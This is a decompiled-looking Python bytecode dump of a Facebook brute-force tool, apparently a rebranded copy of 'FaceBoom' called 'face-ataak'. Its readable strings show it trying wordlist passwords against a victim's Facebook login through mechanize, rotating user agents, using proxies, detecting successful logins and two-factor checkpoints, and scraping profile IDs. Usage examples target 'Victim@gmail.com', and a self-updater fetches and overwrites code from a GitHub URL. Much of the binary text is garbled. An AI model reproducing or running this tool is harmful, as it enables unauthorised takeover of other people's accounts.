o
    [#c{,  ?                   @   sh  d dl Z d dlZd dlZd dlZd dlZd dlZd dlZd dlZejj	dkr+d dl
Z
nd dlmZ
 dZdZdZdZe?d? dd	? Zej?d
d?Zdd? Zzd dlZW n eyi   ed? ed? e?d? Y nw zd dlZW n ey?   ed? ed? e?d? Y nw G dd? de?Ze?d? 	 ed? e?d? e?ed ?Zdd? Z e!dkr?e ?  dS dS )?    N?   z[1;37mz[1;31mz[1;32mz[1;33mz
cls||clearc                 C   s   t j?| ? t j??  d S ?N)?sys?stdout?write?flush)?text? r	   ?/sdcard/face-ataak.pyr      s   r   ?corezversion.txtc                 C   s0   t td t d t d t |  t d t ?S )N?
[?!z	] Error: z !!!
)r   ?rd?yl?wi)?msgr	   r	   r
   ?<lambda>   s   0 r   z[ requests ] module is missingz9  [*] Please Use: 'pip install requests' to install it :)?   z[ mechanize ] module is missingz:  [*] Please Use: 'pip install mechanize' to install it :)c                   @   sP   e Zd Zdd? Zedd? ?Zedd? ?Zdd? Zd	d
? Zdd? Z	edd? ?Z
dS )?FaceBoomc                 C   sB   d | _ t?? | _| j?d? d| jj_dt?g d??fg| j_	d S )NFTz
User-agent)zMozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.24 (KHTML, like Gecko) RockMelt/0.9.58.494 Chrome/11.0.696.71 Safari/534.24zwMozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36ztMozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.54 Safari/535.2zjOpera/9.80 (J2ME/MIDP; Opera Mini/9.80 (S60; SymbOS; Opera Mobi/23.348; U; en) Presto/2.5.25 Version/10.54zgMozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.12 Safari/535.11zaMozilla/5.0 (Windows NT 5.1) AppleWebKit/535.6 (KHTML, like Gecko) Chrome/16.0.897.0 Safari/535.6zUMozilla/5.0 (X11; Linux x86_64; rv:17.0) Gecko/20121202 Firefox/17.0 Iceweasel/17.0.1)
?useProxy?	mechanizeZBrowser?brZset_handle_robotsZ_factoryZis_html?random?choiceZ
addheaders)?selfr	   r	   r
   ?__init__$   s
   

zFaceBoom.__init__c                 C   s`   d|  d|  d?}| ? d?d }ztjd|dd?}||jd	 kr#W d
S W dS  ty/   Y dS w )Nzhttps://zhttp://??https?http?:r   zhttps://www.wikipedia.org?   )?proxiesZtimeoutzX-Client-IPTF)?split?requests?getZheaders?	Exception)?proxyr!   Zproxy_ip?rr	   r	   r
   ?check_proxy3   s   zFaceBoom.check_proxyc                   C   s4   zt ?t ?d?dfd? W dS  t jy   Y dS w )Nzwww.google.com?P   r   TF)?socketZcreate_connectionZgethostbyname?errorr	   r	   r	   r
   ?cnet>   s   ?zFaceBoom.cnetc                 C   s?   zAt td t d t d t ? t?d?}t?|?j}|?|??	? }t td t d t d t d t d t
 | t ? W d S  tyT   td	? t?d
? Y d S w )Nr   ?*z)] geting target Profile Id... please waitz(?<="userID":").*?(?=")?+?]z Target Profilez ID: z&Please Check Your Victim's Profile URLr   )?print?grr   ?re?compiler#   r$   r   ?search?groupr   r%   ?errMsgr   ?exit)r   ?target_profileZidreZconZidisr	   r	   r
   ?get_profile_idG   s    
>?zFaceBoom.get_profile_idc              
   C   s  z7| j ?d? | j jdd? || j jd< || j jd< d| j _| j ?? ?? ?d?r+W dS d	| j ?? v r5W d
S W dS  t	t
fye   ttd t d t d t d t d t ? t?d? t?d? Y d S  ty? } zttd t t|? t d ? t?d? W Y d }~d S d }~ww )Nzhttps://facebook.comr   )ZnrZemail?passZPOSTs	   home_iconr   Z
checkpointr   r   r   r/   z	 Abortingz...g      ??z Error: ?
g333333??)r   ?openZselect_formZform?methodZsubmit?get_data?__contains__?geturl?KeyboardInterrupt?EOFErrorr0   r   r   r   ?time?sleepr   r7   r%   ?str)r   ?target?password?er	   r	   r
   ?loginS   s$   0
 ??zFaceBoom.loginc                 C   s  | j rt| j  t d t d t d ntd t d t d }ttd t d t d t d t d	 t d
 t d t | t d?|sNdt t|? ndt t|? ? t d t|? t ? |s?ttd t d t d t d t d t d t d t ? d S td? d S )N?[ZONr/   ZOFFz1
==================================
[---]        zD A R K z8        [---]
==================================
[---]  zhacker Facebook  z1 [---]
==================================
[---]  zhttps://t.me/name_darkz= [---]
==================================
[>] Target      :> z
{}z[>] Wordlist    :> z[>] Password    :> z
[>] ProxyStatus :> z"==================================z
[~] ZBrutez ForceATTACK: zEnabled z[~]z$
==================================
r;   )r   r1   r   r   r   r0   ?formatrE   )r   rF   ?wordlist?single_passwdZproxystatusr	   r	   r
   ?bannerg   s?   @???????????????&?	?	?
?
?????????????
?zFaceBoom.bannerc                  C   s4  t j?t?std? t?d? td? t?	d?} | ?
dd? | ?? ?? ?? ?? }tt??}|?? ?? }W d   ? n1 s=w   Y  ||krLtd? d S td? | ?
dd	? | ?? ?? ?? ?? }td
d??}|?|? W d   ? n1 suw   Y  ttd??}|?|? W d   ? n1 s?w   Y  td? d S )NzKUnable to check for updates: please re-clone the script to fix this problemr   z[~] Checking for updates...
zraw.githubusercontent.comZGETz'/Oseid/FaceBoom/master/core/version.txtz   [*] The script is up to date!
z/  [+] An update has been found ::: Updating... z"/Oseid/FaceBoom/master/faceboom.pyzfaceboom.py?wz  [+] Successfully updated :)
)?os?path?isfile?versionPathr6   r   r7   r   ?httplibZHTTPSConnectionZrequestZgetresponse?read?strip?decoder<   r0   )ZconnZrepoVersionZvfZcurrentVersionZnewCodeZfaceBoomScriptZverr	   r	   r
   ?updateFaceBoom~   s*   


???zFaceBoom.updateFaceBoomN)?__name__?
__module__?__qualname__r   ?staticmethodr(   r,   r9   rI   rN   rX   r	   r	   r	   r
   r   !   s    


r   ?clearzfiglet M R - D A R K H A  a?  


     |--------
     | python faceboom.py -t Victim@gmail.com -w /usr/share/wordlists/rockyou.txt
     |--------
     | python faceboom.py -t 100001013078780 -w C:\Users\Me\Desktop\wordlist.txt
     |--------
     | python faceboom.py -t Victim@hotmail.com -w D:\wordlist.txt -p 144.217.
     |--------
     | python faceboom.py -t Victim@gmail.com -s 1234567
     |--------
     | python faceboom.py -g https://www.facebook.com/Victim_Profile
     |--------
c               	   C   s?  t jdddddddd? t jd	d
dddddd? t jdddddddd? t jdddddddd? t jddddddd d? t jd!d"d#d$d%d&d'd(? t ?? \} }t? }| j}| j}| j}| j}| j}| j	}||||||g}	t
d)d*? |	D ??r?|?? s?td+? t?d,? |r?|??  t?d,? d S |r?|?|? t?d,? d S |s?|?r?|r?tj?|?s?td-? t?d,? |r?t|?? ?d.k r?td/? td0? t?d,? |?rK|?d1?d2kr?td3t t|? t d4 ? t?d,? ttd5 t d6 t d7 t d8?d9|vr?|n|?d9?d: ? ? d9|v?r|d; n|}
|?|
??r4|
|_|j ?!|j|jd<?? ttd5 t" d= t d4 ? ntd>? td?t t|? t d4 ? t?d,? |?#|||? |?sWd,nd6}|?r`|g}nt$j%|d@dAdB??}|?&? }W d   ? n	1 ?sxw   Y  |D ]?}|?? }t|?d.k ?r??qt'td5 t t|? t dC t t|? t dD ? |?(||?}|?rtj)?'tdE t" dF ? ttdG dHt|?  dI ? ttd5 t" dJ t dK t" | t dL t" dM ? ttdG dHt|?  dI ? |dNk?rttd5 t dO t d4 t dP t dQ t dR t dS t dT ?  n?tj)?'tdE t dU ? |?s/|d, nd6}?q|?rsttdV t dO t dW t dX t | t dY t dZ t dO t ? tt"d5 t dO t" d4 t d[ t" d\ t ? n<ttdV t dO t dW t d] t | t d^ t dZ t dO t ? tt"d5 t dO t" d4 t d_ t" d\ t ? t?d,? d S tt j*? t?d,? d S )`Nz-tz--targetz-Tz--TARGETrF   ?stringzSpecify Target Email or ID)?dest?type?helpz-wz
--wordlistz-Wz
--WORDLISTrL   zSpecify Wordlist File z-sz--singlez--Sz--SINGLE?singlez#Specify Single Password To Check itz-pz-Pz--proxyz--PROXYr&   zSpecify HTTP/S Proxy to be usedz-gz-Gz--getidz--GETID?urlz1Specify TARGET FACEBOOK PROFILE URL to get his IDz-uz-Uz--updatez--UPDATE?update?
store_trueF)r_   ?action?defaultc                 s   s   ? | ]}|V  qd S r   r	   )?.0?optr	   r	   r
   ?	<genexpr>?   s   ? zMain.<locals>.<genexpr>z%Please Check Your Internet Connectionr   zPlease check Your Wordlist Path?   zInvalid Passwordz1[!] Password must be at least '6' characters long?.?   zInvalid IPv4 [r/   rJ   ?~z] Connecting To zProxy[[1;33m {} [1;37m]...r   r   z:8080r   Z	ConnectedzConnection FailedzUnable to connect to Proxy[r'   ?replace)?errorsz] Trying Password[ {z} ]z
 ==> Loginz	 Success
z=========================?=z======r.   z] Password [ z ]z Is Correct :)r   r   z Warning: This account use (z2F Authenticationz):z It's Lockedz !!!z Failed
r   z	] Sorry: zThe Password[ z ] Is Not Correctz:(z) Please Try Another password or Wordlist z:)z'I Can't Find The Correct Password In [ z ] z Please Try Another Wordlist. )+?parseZ
add_option?
parse_argsr   rF   rL   rb   r&   rc   rd   ?anyr,   r6   r   r7   rX   r9   rP   rQ   rR   ?lenrV   r0   ?countr   rE   r   r   rK   r"   r(   r   r   Zset_proxiesr1   rN   ?ior<   ?	readlinesr   rI   r   Zusage)?options?argsZfaceboomrF   rL   rM   r&   r8   rd   ZoptsZfinal_proxyZloopZ	passwords?f?passwdZretCoder	   r	   r
   ?Main?   s?   ?????





@

?44NH2H0
r}   ?__main__)"r*   r   rP   r2   r   ZoptparserC   rw   ?version_info?majorrT   Zhttp.clientZclientr   r   r1   r   ?systemr   rQ   ?joinrS   r6   r#   ?ImportErrorr0   r7   r   ?objectr   ZOptionParserrr   r}   rY   r	   r	   r	   r
   ?<module>   sB   @
??
t
Z
?